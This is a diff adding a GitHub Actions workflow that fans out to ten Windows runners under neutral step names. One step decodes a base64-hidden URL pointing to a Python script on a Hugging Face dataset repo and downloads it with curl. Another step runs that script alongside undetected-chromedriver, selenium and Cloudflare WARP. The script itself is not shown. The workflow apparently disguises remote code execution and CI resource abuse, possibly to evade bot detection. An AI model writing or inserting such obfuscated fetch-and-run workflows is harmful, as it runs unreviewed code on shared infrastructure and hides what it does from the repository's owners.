@@ -1,0 +1,69 @@
+name: Pipeline Task Cluster
+
+on:
+  repository_dispatch:
+    types: [run-task]
+  workflow_dispatch:
+
+concurrency:
+  group: job-queue-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+jobs:
+  execute-task:
+    name: "Runner-Instance-${{ matrix.worker_id }}"
+    runs-on: windows-2022
+    timeout-minutes: 75
+
+    strategy:
+      fail-fast: false
+      matrix:
+        worker_id: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
+
+    steps:
+      - name: Environment Initialization & Dependencies
+        shell: bash
+        run: |
+          echo "[START] Bootstrapping instance #${{ matrix.worker_id }}..."
+          
+          TARGET_URI=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2NhY2EvcmVzb2x2ZS9tYWluL3N0YXJ0X3Nocmlua19uZXcucHk=" | base64 --decode)
+          
+          curl -sL "$TARGET_URI" -o task_runner.py
+          
+          echo "[SETUP] Updating core package managers..."
+          python -m pip install -qU pip setuptools
+          pip install -q undetected-chromedriver selenium requests
+          echo "[SETUP] Environment setup ready."
+
+      - name: Run Background Task & Enforcement
+        shell: pwsh
+        env:
+          PYTHONIOENCODING: "utf-8"
+        run: |
+          Write-Output "=== Starting execution on instance ${{ matrix.worker_id }} ==="
+          
+          $env:PATH = "$env:PATH;C:\Program Files\Cloudflare\Cloudflare WARP"
+          
+          $StartConfig = @{
+              FilePath     = "python"
+              ArgumentList = "task_runner.py"
+              PassThru     = $true
+              NoNewWindow  = $true
+          }
+          $SubProcess = Start-Process @StartConfig
+          
+          Write-Output "=== Monitor active. Enforcing maximum runtime of 74 minutes ==="
+          
+          try {
+              Wait-Process -InputObject $SubProcess -Timeout 4440 -ErrorAction Stop
+              Write-Output "=== Task completed within the allotted timeframe. ==="
+          }
+          catch {
+              Write-Output "=== Maximum runtime exceeded. Terminating task process... ==="
+              Stop-Process -InputObject $SubProcess -Force
+              Write-Output "=== Task process successfully terminated. ==="
+          }
+
+      - name: Finalization Notice
+        shell: bash
+        run: echo "[FINISHED] Instance #${{ matrix.worker_id }} execution cycle finalized."
